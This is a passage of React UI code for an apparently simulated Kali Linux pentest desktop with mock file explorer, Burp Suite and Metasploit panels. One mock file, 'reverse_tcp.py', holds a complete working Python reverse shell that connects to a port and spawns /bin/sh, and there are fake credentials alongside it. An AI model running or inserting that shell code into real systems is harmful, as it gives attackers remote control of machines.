              <div className="h-9 bg-[#2d2d2d] border-b border-white/5 flex items-center justify-between px-3 shrink-0 rounded-t-lg">
                <div className="flex items-center gap-3">
                   <Folder className="w-3.5 h-3.5 text-amber-500" />
                   <span className="text-[10px] text-white/70 font-sans tracking-tight font-bold uppercase tracking-wider">File Explorer - Home</span>
                </div>
                <div className="flex items-center gap-3">
                   <X onClick={() => setShowFiles(false)} className="w-3.5 h-3.5 text-white/30 cursor-pointer hover:text-red-500" />
                </div>
              </div>
              
              {!isFilesDecrypted ? (
                <div className="flex-1 flex flex-col items-center justify-center p-8 bg-[#151515] relative overflow-hidden">
                  <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_rgba(239,68,68,0.05)_0%,_transparent_70%)]" />
                  
                  <div className="w-14 h-14 bg-red-500/10 border border-red-500/30 rounded-2xl flex items-center justify-center mb-4 text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.1)] relative">
                    <Folder className="w-6 h-6" />
                    <div className="absolute -top-1 -right-1 bg-red-500 text-[8px] px-1 rounded font-bold text-white uppercase animate-pulse">LOCKED</div>
                  </div>

                  <h3 className="text-sm font-bold text-white tracking-wider uppercase mb-1">Partition Encrypted</h3>
                  <p className="text-[10px] text-slate-500 font-mono uppercase tracking-widest mb-4">AES-XTS-512 // SECURE_STORAGE_RING_0</p>
                  
                  <div className="max-w-xs text-center text-[10px] text-slate-400 leading-relaxed mb-6 font-sans">
                    The local directory partition <code className="text-red-400 font-mono bg-red-500/5 px-1 py-0.5 rounded border border-red-500/10">/home/root</code> is locked. A valid signature token from the System HSM is required to mount the decrypted sectors.
                  </div>

                  <button
                    onClick={handleMountDirectory}
                    disabled={isDecryptingFiles}
                    className="px-5 py-3 bg-cyan-600 hover:bg-cyan-500 text-white rounded-xl font-bold flex items-center gap-2.5 transition-all border border-cyan-400/20 shadow-[0_0_15px_rgba(6,182,212,0.3)] disabled:opacity-50 text-[10px] uppercase tracking-wider font-mono active:scale-95"
                  >
                    {isDecryptingFiles ? (
                      <>
                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
                        <span>Negotiating HSM Keys...</span>
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-3.5 h-3.5" />
                        <span>Mount & Decrypt Partition via HSM</span>
                      </>
                    )}
                  </button>
                </div>
              ) : (
                <div className="flex-1 flex bg-[#161616] overflow-hidden text-xs text-slate-300 font-sans">
                  {/* Left navigation pane */}
                  <div className="w-40 border-r border-white/5 bg-[#1b1b1b] p-3 flex flex-col gap-2 shrink-0">
                    <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-2 pl-1">Partitions</div>
                    <div 
                      onClick={() => { setCurrentDirPath([]); setSelectedFile(null); }}
                      className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${currentDirPath.length === 0 ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20' : 'text-slate-400'}`}
                    >
                      <Folder className="w-3.5 h-3.5 text-cyan-500" />
                      <span className="font-medium tracking-tight">/home/root</span>
                    </div>
                    <div className="pl-4 flex flex-col gap-1 border-l border-white/5 ml-3 mt-1">
                      <div 
                        onClick={() => { setCurrentDirPath(['recon_data']); setSelectedFile(null); }}
                        className={`flex items-center gap-2 p-1.5 rounded-md cursor-pointer transition-all hover:text-white ${currentDirPath[0] === 'recon_data' ? 'text-cyan-400 font-medium' : 'text-slate-500'}`}
                      >
                        <Folder className="w-3 h-3 text-amber-500/70" />
                        <span>recon_data</span>
                      </div>
                      <div 
                        onClick={() => { setCurrentDirPath(['exploit_payloads']); setSelectedFile(null); }}
                        className={`flex items-center gap-2 p-1.5 rounded-md cursor-pointer transition-all hover:text-white ${currentDirPath[0] === 'exploit_payloads' ? 'text-cyan-400 font-medium' : 'text-slate-500'}`}
                      >
                        <Folder className="w-3 h-3 text-amber-500/70" />
                        <span>exploit_payloads</span>
                      </div>
                    </div>
                  </div>

                  {/* Right files list pane */}
                  <div className="flex-1 flex flex-col overflow-hidden">
                    {/* Address bar */}
                    <div className="h-7 bg-[#1c1c1c] border-b border-white/5 flex items-center px-3 gap-2 shrink-0 text-[10px] font-mono text-slate-500">
                      <span>root@kali:</span>
                      <span className="text-white/80">/home/root{currentDirPath.length > 0 ? '/' + currentDirPath.join('/') : ''}</span>
                    </div>

                    {/* Files List / Preview Layout */}
                    <div className="flex-1 flex overflow-hidden">
                      {/* Files list */}
                      <div className="flex-1 p-3 overflow-y-auto space-y-1 custom-scrollbar">
                        {/* Back button if in subdirectory */}
                        {currentDirPath.length > 0 && (
                          <div 
                            onClick={() => { setCurrentDirPath([]); setSelectedFile(null); }}
                            className="flex items-center gap-2.5 p-2 rounded-lg cursor-pointer hover:bg-white/5 text-slate-500 hover:text-white font-mono text-[10px]"
                          >
                            <span>..</span>
                            <span>[Go Back to /home/root]</span>
                          </div>
                        )}

                        {/* Folder contents */}
                        {currentDirPath.length === 0 ? (
                          <>
                            {/* Subfolders */}
                            <div 
                              onDoubleClick={() => setCurrentDirPath(['recon_data'])}
                              onClick={() => setSelectedFile({ name: 'recon_data', type: 'dir' })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'recon_data' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <Folder className="w-4 h-4 text-amber-400" />
                                <span className="font-medium text-slate-200">recon_data</span>
                              </div>
                              <span className="text-[10px] text-slate-600 font-mono">Folder</span>
                            </div>
                            
                            <div 
                              onDoubleClick={() => setCurrentDirPath(['exploit_payloads'])}
                              onClick={() => setSelectedFile({ name: 'exploit_payloads', type: 'dir' })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'exploit_payloads' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <Folder className="w-4 h-4 text-amber-400" />
                                <span className="font-medium text-slate-200">exploit_payloads</span>
                              </div>
                              <span className="text-[10px] text-slate-600 font-mono">Folder</span>
                            </div>

                            {/* Files */}
                            <div 
                              onClick={() => setSelectedFile({ 
                                name: 'README.txt', 
                                type: 'file', 
                                size: '1.2 KB',
                                content: '=========================================\nNEXUS AI SECURITY SYSTEM - TARGET DESKTOP\n=========================================\n\nIP Target Address: 192.168.12.55\nAuthorized Operator: NEXUS_OPERATOR\n\nActive Nodes detected in subnet:\n- 192.168.12.1   (Gateway Router)\n- 192.168.12.55  (Kali Pentest Node - Local)\n- 192.168.12.102 (Database Master Node)\n\nNOTICE:\nAll operations are recorded to MATRIX_CORE. Log files under recon_data/ are active.'
                              })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'README.txt' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <div className="w-4 h-4 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[9px] font-bold">T</div>
                                <span className="font-medium text-slate-300">README.txt</span>
                              </div>
                              <div className="flex items-center gap-4">
                                <span className="text-[10px] text-slate-600 font-mono">1.2 KB</span>
                                <span className="text-[10px] text-slate-600 font-mono">Text Document</span>
                              </div>
                            </div>

                            <div 
                              onClick={() => setSelectedFile({ 
                                name: 'credentials.db.enc', 
                                type: 'file', 
                                size: '512 B',
                                isEncrypted: true,
                                encryptedContent: 'U2FsdGVkX1+Tz1Q5V2K9G6H7m8X8W9A0Q1B2C3D4E5F6==',
                                decryptedContent: '{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}',
                                content: '[ENCRYPTED PAYLOAD - AES-256-GCM]\nUse HSM decrypt or double-click to decrypt key.'
                              })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'credentials.db.enc' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <div className="w-4 h-4 rounded bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-mono text-[9px] font-bold">E</div>
                                <span className="font-medium text-slate-300">credentials.db.enc</span>
                              </div>
                              <div className="flex items-center gap-4">
                                <span className="text-[10px] text-slate-600 font-mono">512 B</span>
                                <span className={`text-[9px] px-1.5 py-0.5 rounded font-bold uppercase tracking-tight ${credentialsFileDecrypted ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
                                  {credentialsFileDecrypted ? 'DECRYPTED' : 'ENCRYPTED'}
                                </span>
                              </div>
                            </div>
                          </>
                        ) : currentDirPath[0] === 'recon_data' ? (
                          <>
                            <div 
                              onClick={() => setSelectedFile({ 
                                name: 'nmap_scan.log', 
                                type: 'file', 
                                size: '2.4 KB',
                                content: 'Starting Nmap 7.92 at 2026-05-18 19:05 EST\nNmap scan report for 192.168.12.55\nHost is up (0.00012s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH 8.4p1 Debian 5+deb11u1\n80/tcp   open  http         Apache httpd 2.4.56\n443/tcp  open  ssl/http     Apache httpd 2.4.56\n3000/tcp open  http         Node.js Express\n4444/tcp open  metasploit   Reverse TCP Handler\n\nNmap done: 1 IP address scanned in 2.10 seconds'
                              })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'nmap_scan.log' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <div className="w-4 h-4 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[9px] font-bold">L</div>
                                <span className="font-medium text-slate-300">nmap_scan.log</span>
                              </div>
                              <div className="flex items-center gap-4">
                                <span className="text-[10px] text-slate-600 font-mono">2.4 KB</span>
                                <span className="text-[10px] text-slate-600 font-mono">Log File</span>
                              </div>
                            </div>

                            <div 
                              onClick={() => setSelectedFile({ 
                                name: 'ssl_audit.json', 
                                type: 'file', 
                                size: '920 B',
                                content: '{\n  "target": "192.168.12.55",\n  "port": 443,\n  "weak_protocols": ["TLSv1.0", "TLSv1.1"],\n  "vulnerable_ciphers": [\n    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",\n    "TLS_RSA_WITH_AES_128_CBC_SHA"\n  ],\n  "heartbleed_vulnerable": false,\n  "beast_vulnerable": true\n}'
                              })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'ssl_audit.json' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <div className="w-4 h-4 rounded bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 font-mono text-[9px] font-bold">J</div>
                                <span className="font-medium text-slate-300">ssl_audit.json</span>
                              </div>
                              <div className="flex items-center gap-4">
                                <span className="text-[10px] text-slate-600 font-mono">920 B</span>
                                <span className="text-[10px] text-slate-600 font-mono">JSON Document</span>
                              </div>
                            </div>
                          </>
                        ) : (
                          <>
                            <div 
                              onClick={() => setSelectedFile({ 
                                name: 'reverse_tcp.py', 
                                type: 'file', 
                                size: '3.1 KB',
                                content: 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("192.168.12.55",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])'
                              })}
                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'reverse_tcp.py' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
                            >
                              <div className="flex items-center gap-2.5">
                                <div className="w-4 h-4 rounded bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 font-mono text-[9px] font-bold">P</div>
                                <span className="font-medium text-slate-300">reverse_tcp.py</span>
                              </div>
                              <div className="flex items-center gap-4">
                                <span className="text-[10px] text-slate-600 font-mono">3.1 KB</span>
                                <span className="text-[10px] text-slate-600 font-mono">Python Script</span>
                              </div>
                            </div>
                          </>
                        )}
                      </div>

                      {/* Preview Pane */}
                      <div className="w-64 border-l border-white/5 bg-[#171717] p-3 flex flex-col overflow-hidden shrink-0">
                        {selectedFile ? (
                          <div className="flex-1 flex flex-col overflow-hidden">
                            <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-2 pl-1">Properties</div>
                            <div className="flex items-center gap-2 mb-3 bg-black/20 p-2 rounded-lg border border-white/5 shrink-0">
                              {selectedFile.type === 'dir' ? (
                                <Folder className="w-5 h-5 text-amber-400" />
                              ) : selectedFile.name === 'credentials.db.enc' ? (
                                <div className="w-5 h-5 rounded bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-mono text-[10px] font-bold">E</div>
                              ) : (
                                <div className="w-5 h-5 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[10px] font-bold">T</div>
                              )}
                              <div className="overflow-hidden">
                                <div className="font-bold text-white truncate text-[11px]" title={selectedFile.name}>{selectedFile.name}</div>
                                <div className="text-[9px] text-slate-500 font-mono uppercase truncate">{selectedFile.type === 'dir' ? 'Directory' : selectedFile.size}</div>
                              </div>
                            </div>

                            {selectedFile.type === 'dir' ? (
                              <div className="flex-1 flex flex-col items-center justify-center text-center p-4 text-slate-500 font-sans italic text-[10px]">
                                Double-click folder to open its contents.
                              </div>
                            ) : (
                              <div className="flex-1 flex flex-col overflow-hidden">
                                {selectedFile.isEncrypted && !credentialsFileDecrypted ? (
                                  <div className="flex-1 flex flex-col items-center justify-center text-center p-4 bg-black/40 border border-red-500/10 rounded-xl relative shrink-0 overflow-y-auto mb-2 space-y-3">
                                    <div className="w-8 h-8 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 animate-pulse shrink-0">
                                      <Key className="w-4 h-4" />
                                    </div>
                                    <div className="text-[10px] font-bold text-red-400 uppercase tracking-tight shrink-0">HSM Protection Active</div>
                                    <div className="text-[9px] text-slate-400 shrink-0 leading-relaxed font-sans max-w-[180px]">
                                      The contents of <code className="text-red-400 font-mono bg-red-500/5 px-1 py-0.5 rounded border border-red-500/10">credentials.db.enc</code> are locked. Use System HSM signature key translation to decrypt the data sector.
                                    </div>
                                    
                                    <button
                                      onClick={async () => {
                                        setIsDecryptingCredentialsFile(true);
                                        setTerminalLogs(prev => [...prev, { text: `[*] Requesting HSM translation for credentials.db.enc [RDP_SIGN_V1]...`, type: 'security' }]);
                                        setTimeout(() => {
                                          setCredentialsFileDecrypted(true);
                                          setIsDecryptingCredentialsFile(false);
                                          setTerminalLogs(prev => [
                                            ...prev,
                                            { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Decrypted data sector for credentials.db.enc (AES-256-GCM).', type: 'security' },
                                            { text: 'Target database access credentials mounted.', type: 'output' }
                                          ]);
                                        }, 1000);
                                      }}
                                      disabled={isDecryptingCredentialsFile}
                                      className="px-4 py-2 bg-red-600/90 hover:bg-red-500 text-white rounded-lg font-bold flex items-center gap-1.5 transition-all border border-red-400/20 shadow-[0_0_10px_rgba(239,68,68,0.2)] disabled:opacity-50 text-[9px] uppercase tracking-wider font-mono shrink-0"
                                    >
                                      {isDecryptingCredentialsFile ? (
                                        <>
                                          <Loader2 className="w-3 animate-spin" />
                                          <span>Decrypting...</span>
                                        </>
                                      ) : (
                                        <>
                                          <ShieldCheck className="w-3" />
                                          <span>Decrypt with HSM</span>
                                        </>
                                      )}
                                    </button>
                                  </div>
                                ) : (
                                  <div className="flex-1 flex flex-col overflow-hidden">
                                    <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-1 pl-1">File Preview</div>
                                    <div className="flex-1 p-2 bg-black/40 border border-white/5 rounded-xl font-mono text-[9px] text-emerald-400 overflow-y-auto whitespace-pre-wrap leading-tight select-text custom-scrollbar">
                                      {selectedFile.isEncrypted && credentialsFileDecrypted ? selectedFile.decryptedContent : selectedFile.content}
                                    </div>
                                  </div>
                                )}
                              </div>
                            )}
                          </div>
                        ) : (
                          <div className="flex-1 flex flex-col items-center justify-center text-center p-4 text-slate-600 font-sans italic text-[10px]">
                            Select a file to preview its contents and properties.
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </motion.div>
          )}

          {showBrowser && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="absolute inset-x-2 top-10 md:left-60 md:w-1/2 h-[60%] bg-white border border-white/10 rounded-lg shadow-2xl flex flex-col backdrop-blur-md z-[55] resize overflow-hidden min-w-[300px] min-h-[200px]"
            >
              <div className="h-9 bg-[#f0f0f0] border-b border-black/10 flex items-center justify-between px-3 shrink-0 rounded-t-lg text-black">
                <div className="flex items-center gap-3">
                   <Chrome className="w-3.5 h-3.5 text-blue-600" />
                   <span className="text-[10px] font-sans tracking-tight">Google Chrome</span>
                </div>
                <div className="flex items-center gap-3">
                   <X onClick={() => setShowBrowser(false)} className="w-3.5 h-3.5 text-black/50 cursor-pointer hover:text-red-500" />
                </div>
              </div>
              <div className="flex-1 bg-slate-50 flex flex-col relative overflow-hidden">
                {/* Browser Address Bar Area */}
                <div className="bg-[#e0e0e0] h-9 flex items-center px-2 gap-2 shrink-0 border-b border-black/10">
                   <div className="flex gap-1.5 px-2">
                     <div className="w-3 h-3 rounded-full bg-slate-300 hover:bg-slate-400 transition-colors cursor-pointer" />
                     <div className="w-3 h-3 rounded-full bg-slate-300 hover:bg-slate-400 transition-colors cursor-pointer" />
                   </div>
                   <form 
                     className="flex-1 bg-white rounded-md h-6 flex items-center px-2 border border-slate-300 shadow-inner group focus-within:border-blue-400 focus-within:ring-1 focus-within:ring-blue-400/50"
                     onSubmit={(e) => {
                       e.preventDefault();
                       const form = e.target as HTMLFormElement;
                       const input = form.elements.namedItem('url') as HTMLInputElement;
                       let val = input.value;
                       if (!val.startsWith('http://') && !val.startsWith('https://')) {
                         val = 'https://' + val;
                         input.value = val;
                       }
                       // For functional purposes, we can force a re-render of the iframe by appending a dummy hash if needed, but standard iframe src update works.
                       form.setAttribute('data-url', val);
                       const iframe = form.parentElement?.nextElementSibling as HTMLIFrameElement;
                       if (iframe) iframe.src = val;
                     }}
                   >
                     <input 
                       name="url"
                       defaultValue="https://example.com"
                       className="w-full h-full bg-transparent border-none outline-none text-[11px] text-slate-700 font-sans"
                     />
                   </form>
                </div>
                {/* Page Content */}
                <iframe 
                  src="https://example.com" 
                  className="w-full h-full border-none bg-white"
                  sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
                  title="Browser Content"
                />
              </div>
            </motion.div>
          )}

          {showBurp && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="absolute top-24 left-24 w-1/2 h-1/2 bg-[#2d2d2d] border border-orange-500/30 rounded-lg shadow-2xl flex flex-col backdrop-blur-md"
            >
              <div className="h-9 bg-[#ff6633] border-b border-black/20 flex items-center justify-between px-3 shrink-0 rounded-t-lg">
                <div className="flex items-center gap-3">
                   <Search className="w-3.5 h-3.5 text-white" />
                   <span className="text-[10px] text-white font-sans tracking-tight font-bold">Burp Suite Professional</span>
                </div>
                <div className="flex items-center gap-3">
                   <X onClick={() => setShowBurp(false)} className="w-3.5 h-3.5 text-white/70 cursor-pointer hover:text-red-900" />
                </div>
              </div>
              <div className="flex-1 p-0 flex flex-col bg-[#1e1e1e] overflow-hidden">
                <div className="h-8 bg-[#333] border-b border-black/20 flex items-center px-2 gap-4 text-[10px] text-slate-300">
                   <span className="font-bold text-orange-400 border-b-2 border-orange-400 pb-1">Proxy</span>
                   <span>Target</span>
                   <span>Intruder</span>
                   <span>Repeater</span>
                   <span>Sequencer</span>
                </div>
                <div className="h-8 bg-[#2d2d2d] border-b border-black/20 flex items-center px-2 gap-2 text-[10px]">
                   <button className="bg-orange-500 text-white px-2 py-1 rounded font-bold hover:bg-orange-400 transition-colors shadow-lg">Intercept is on</button>
                   <button className="bg-[#444] text-white px-2 py-1 rounded hover:bg-[#555] transition-colors">Forward</button>
                   <button className="bg-[#444] text-white px-2 py-1 rounded hover:bg-[#555] transition-colors">Drop</button>
                   <span className="ml-auto text-emerald-500 font-mono flex items-center gap-1">
                      <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" /> 127.0.0.1:8080
                   </span>
                </div>
                <div className="flex-1 p-2 font-mono text-[9px] text-emerald-400 bg-black/50 overflow-y-auto">
                   <div className="text-white">GET /api/v1/auth/session HTTP/1.1</div>
                   <div>Host: target-system.local</div>
                   <div>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</div>
                   <div>Accept: application/json</div>
                   <div>Authorization: Bearer [REDACTED]</div>
                   <div>Connection: close</div>
                   <br/>
                   <div className="text-slate-500 italic">// Awaiting modification...</div>
                </div>
              </div>
            </motion.div>
          )}

          {showMetasploit && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="absolute inset-x-2 top-16 md:left-48 md:w-3/4 h-3/4 bg-[#0a0a0a] border border-red-500/30 rounded-lg shadow-2xl flex flex-col backdrop-blur-md z-[55] resize overflow-hidden min-w-[300px] md:min-w-[500px] min-h-[350px]"
            >
              {/* Terminal Title Bar */}
              <div className="h-9 bg-[#111] border-b border-red-500/20 flex items-center justify-between px-3 shrink-0 rounded-t-lg">
                <div className="flex items-center gap-3">
                   <Crosshair className="w-3.5 h-3.5 text-red-500" />
                   <span className="text-[10px] text-white/50 font-mono tracking-tight">msfconsole</span>
                </div>
                <div className="flex items-center gap-3">
                   <X onClick={() => setShowMetasploit(false)} className="w-3.5 h-3.5 text-white/30 cursor-pointer hover:text-red-500" />
                </div>
              </div>
              
              {/* Terminal Content */}
              <div className="flex-1 p-4 font-mono text-[11px] overflow-y-auto space-y-1 custom-scrollbar">
                 {metasploitHistory.map((log, i) => (
                   <div key={i} className="flex flex-col">
                     {log.type === 'input' && (
                       <div className="flex gap-2">
                         <span className="text-red-400 font-bold underline decoration-red-500/30">msf6</span>
                         <span className="text-white">&gt; {log.text.replace('msf6 > ', '')}</span>
                       </div>
                     )}
                     {log.type === 'prompt' && (
                       <div className="flex gap-2 mt-2">
                         <span className="text-red-400 font-bold underline decoration-red-500/30">{log.text.replace(' > ', '')}</span>
                         <span className="text-white">&gt; </span>
                       </div>
                     )}
                     {log.type === 'meterpreter' && (
                       <div className="flex gap-2 mt-2">
                         <span className="text-red-400 font-bold underline decoration-red-500/30">meterpreter</span>
                         <span className="text-white">&gt; </span>
                       </div>
                     )}
                     {log.type === 'output' && (
                       <div className="text-slate-300 py-0.5 whitespace-pre-wrap break-all">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'info' && (
                       <div className="text-cyan-400 py-0.5 font-bold">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'success' && (
                       <div className="text-emerald-500 py-0.5 font-bold whitespace-pre-wrap break-all">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'error' && (
                       <div className="text-red-500 py-0.5 font-bold">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'banner' && (
                       <pre className="text-red-500 font-bold opacity-80 leading-tight select-none">
                         {log.text}
                       </pre>
                     )}
                   </div>
                 ))}
                 
                 <form onSubmit={handleMetasploitSubmit} className="flex gap-2 pt-2 items-center">
                    <span className="text-red-400 font-bold underline decoration-red-500/30">msf6</span>
                    <span className="text-white">&gt;</span>
                    <input 
                      type="text"
                      value={metasploitInput}
                      onChange={(e) => setMetasploitInput(e.target.value)}
                      className="flex-1 bg-transparent border-none outline-none text-white font-mono"
                      autoFocus
                    />
                    <div className="w-1.5 h-3 bg-red-500 animate-pulse" />
                 </form>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* KALI BOTTOM DOCK */}
      <div className="h-12 absolute bottom-4 left-1/2 -translate-x-1/2 flex items-center gap-4 px-6 bg-black/40 border border-white/10 rounded-2xl backdrop-blur-xl shadow-xl z-50">
         <DockIcon icon={Terminal} onClick={() => setShowTerminal(true)} hasIndicator={showTerminal} />
         <DockIcon icon={Folder} onClick={() => setShowFiles(true)} hasIndicator={showFiles} />
         <DockIcon icon={Chrome} onClick={() => setShowBrowser(true)} hasIndicator={showBrowser} />
         <DockIcon icon={Search} onClick={() => setShowBurp(true)} hasIndicator={showBurp} />
         <DockIcon icon={Crosshair} onClick={() => setShowMetasploit(true)} hasIndicator={showMetasploit} />
      </div>

      {/* SSH KEY MANAGER MODAL */}
      <AnimatePresence>
        {showKeyManager && (
          <div className="absolute inset-0 z-[100] flex items-center justify-center p-8">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
              onClick={() => setShowKeyManager(false)}
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="relative w-full max-w-2xl bg-slate-900 border border-slate-800 rounded-3xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-6 border-b border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-cyan-500/10 rounded-lg">
                    <Key className="w-5 h-5 text-cyan-500" />
                  </div>
                  <div>
                    <h3 className="text-white font-bold tracking-tight">SECURE_SSH_VAULT</h3>
                    <p className="text-[10px] text-slate-500 font-mono uppercase tracking-widest">HSM-Backed Key Management</p>
                  </div>
                </div>
                <button 
                  onClick={() => setShowKeyManager(false)}
                  className="p-2 hover:bg-slate-800 rounded-lg text-slate-500 hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-6 space-y-8 custom-scrollbar">
                {/* ADD NEW KEY */}
                <div className="space-y-4">
                  <h4 className="text-[10px] font-bold text-slate-400 uppercase tracking-widest flex items-center gap-2">
                    <Plus className="w-3 h-3" />
                    Register New Identity
                  </h4>
                  <form onSubmit={handleAddKey} className="space-y-3">
                    <input 
                      type="text"
                      placeholder="Identifer (e.g. Kali_Laptop_X1)"
                      value={newKeyLabel}
                      onChange={(e) => setNewKeyLabel(e.target.value)}
                      className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white font-mono focus:border-cyan-500/50 outline-none transition-all"
                    />
                    <textarea 
                      placeholder="Paste public key (ssh-rsa ...)"
                      value={newPublicKey}
                      onChange={(e) => setNewPublicKey(e.target.value)}
                      className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-xs text-white/70 font-mono h-24 focus:border-cyan-500/50 outline-none transition-all resize-none"
                    />
                    <button 
                      type="submit"
                      disabled={isAddingKey || !newKeyLabel || !newPublicKey}
                      className="w-full bg-cyan-600 hover:bg-cyan-500 text-white py-3 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                    >
                      {isAddingKey ? <Loader2 className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
                      ENCRYPT_AND_STORE_IN_VAULT
                    </button>
                  </form>
                </div>

                {/* KEY LIST */}
                <div className="space-y-4">
                  <h4 className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Active Keys ({sshKeys.length})</h4>
                  {isKeysLoading ? (
                    <div className="flex justify-center p-8">
                      <Loader2 className="w-6 h-6 text-cyan-500 animate-spin" />
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {sshKeys.length === 0 ? (
                        <div className="text-center py-8 bg-black/20 rounded-2xl border border-dashed border-slate-800 text-slate-600 text-xs italic">
                          No identity keys found in encrypted storage.
                        </div>
                      ) : (
                        <div className="space-y-4">
                          {sshKeys.map(key => (
                            <div key={key.id} className="space-y-1">
                              <div className="group p-4 bg-black/40 border border-slate-800 rounded-2xl flex items-center justify-between hover:border-slate-700 transition-all">
                                <div className="flex items-center gap-4">
                                  <div className="w-10 h-10 bg-slate-800 rounded-xl flex items-center justify-center text-slate-500 group-hover:text-cyan-400 transition-colors">
                                    <Key className="w-5 h-5" />
                                  </div>
                                  <div>
                                    <p className="text-sm font-bold text-white tracking-tight">{key.label}</p>
                                    <p className="text-[9px] text-slate-500 font-mono uppercase tracking-tighter">
                                      ID: {key.id.slice(0, 8)}... // Created: {new Date(key.createdAt).toLocaleDateString()}
                                    </p>
                                  </div>
                                </div>
                                <div className="flex items-center gap-2">
                                  <button 
                                    onClick={() => handleTranslateKey(key)}
                                    className={`p-2 rounded-lg transition-colors ${viewingDecryptedKey?.id === key.id ? 'bg-cyan-500/20 text-cyan-400' : 'hover:bg-slate-800 text-slate-500 hover:text-cyan-400'}`}
                                    title="Translate Key (HSM)"
                                  >
                                    {viewingDecryptedKey?.id === key.id ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                                  </button>
                                  <button 
                                    onClick={() => handleDeleteKey(key.id)}
